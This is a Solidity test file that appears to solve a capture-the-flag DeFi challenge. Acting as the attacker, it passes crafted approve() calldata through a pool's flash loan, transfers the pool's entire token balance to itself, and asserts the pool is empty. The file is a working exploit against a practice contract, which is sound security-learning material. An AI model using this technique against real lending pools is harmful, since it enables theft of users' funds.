// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./utils/FreeFixture.sol";

contract FreeTest is FreeFixture {

    function setUp() public override {
        super.setUp();
    }

    function test_free() public {
        bytes memory data;
        // Start acting as the attacker for the remainder of the exploit
        vm.startPrank(attacker);

        //After Borrow the money, the flashloan expects a calldata target.functionCall(data);
        data = abi.encodeWithSignature("approve(address,uint256)", attacker, token.balanceOf(address(pool)));
        console.logBytes(data);
        pool.flashLoan(0,address(pool),address(token),data);

        token.transferFrom(address(pool), attacker, token.balanceOf(address(pool)));

        vm.stopPrank();

        _assertions();
    }

    function _assertions() internal {
        // Attacker has taken all tokens from the pool
        assertEq(token.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(token.balanceOf(address(pool)), 0);
    }
}